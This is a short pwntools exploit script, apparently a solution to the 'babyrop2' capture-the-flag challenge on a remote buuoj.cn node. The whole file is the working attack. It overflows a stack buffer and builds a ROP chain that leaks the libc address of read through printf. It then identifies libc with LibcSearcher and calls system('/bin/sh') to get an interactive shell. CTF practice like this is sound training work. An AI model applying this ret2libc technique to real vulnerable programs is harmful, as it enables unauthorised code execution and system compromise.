from pwn import *
from LibcSearcher import LibcSearcher

#
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='i386', log_level='debug')
#io = process('./babyrop2')
#
io = remote('node5.buuoj.cn',29167)
elf=ELF('./babyrop2')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

main=0x400636
pp=plt('printf')
pg=got('read')
rdi=0x0000000000400733
rsi_r15=0x0000000000400731
ret=0x00000000004006CB
fmtstr=0x0000000000400770

ru('name? ')
pl=b'a'*(0x20+8)
pl+=p64(rdi)+p64(fmtstr)
pl+=p64(rsi_r15)+p64(pg)+p64(fmtstr)
pl+=p64(pp)+p64(ret)+p64(main)
sl(pl)

pr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(pr))
libc=LibcSearcher('read',pr)
lb=pr-libc.dump('read')
sa=lb+libc.dump('system')
ba=lb+libc.dump('str_bin_sh')

#ru('name? ')
pl=b'a'*(0x20+8)
pl+=p64(rdi)+p64(ba)
pl+=p64(ret)+p64(sa)
sl(pl)


#
io.interactive()
